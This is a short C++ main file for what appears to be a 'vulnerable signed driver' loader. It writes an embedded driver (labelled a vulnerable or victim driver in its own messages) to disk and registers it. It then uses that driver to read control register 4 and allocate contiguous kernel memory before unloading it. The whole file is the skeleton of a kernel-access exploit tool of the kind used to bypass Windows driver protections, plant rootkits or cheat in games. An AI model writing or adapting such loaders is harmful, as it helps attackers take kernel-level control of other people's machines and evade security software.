#include "communication.h"


int main()
{
	SetConsoleTitleA("checking....");
	Sleep(600);

	if (FindWindowA(NULL, "Test Project"))
	{
		logOutput::LogMessage("Press [ENTER] to close");
		std::cin.get();
		return false;
	}

	SetConsoleTitleA("Test Project");
	std::cout << "\n";

	logOutput::LogMessage("Writing driver to memory...");
	if (!load_signed::WriteFileToMemory(load_signed::GetDriverPath().c_str(), reinterpret_cast<const char*>(asromgdrv::driver), sizeof(asromgdrv::driver)))
	{
		logOutput::LogError("Error writing vulnerable driver 1 to memory");
		std::cin.get();
		return false;
	}

	if (!load_signed::RegisterSignedDriver(load_signed::GetDriverPath().c_str(), load_signed::GetDriverName().c_str()))
	{
		logOutput::LogError("Unable to register signed driver 1 to memory");
		std::cin.get();
		return false;
	}

	communication::InitGlobalHandle();

	ULONGLONG AllocatedMemoryBlock = communication::AllocateContigiousMemory(5).first;
	logOutput::DebugLogAddr("Control register 4 value: ", communication::ReadControlRegister(4));
	logOutput::DebugLogAddr("Allocated memory block: ", AllocatedMemoryBlock);
	


	logOutput::LogMessage("Unloading Victim driver one...");
	if (!load_signed::UnloadSignedDriver(load_signed::GetDriverName().c_str()))
	{
		logOutput::LogError("Please reload kvdloader");
		system("pause>0");
		return false;
	}
	
	system("pause>0");
	return true;
}
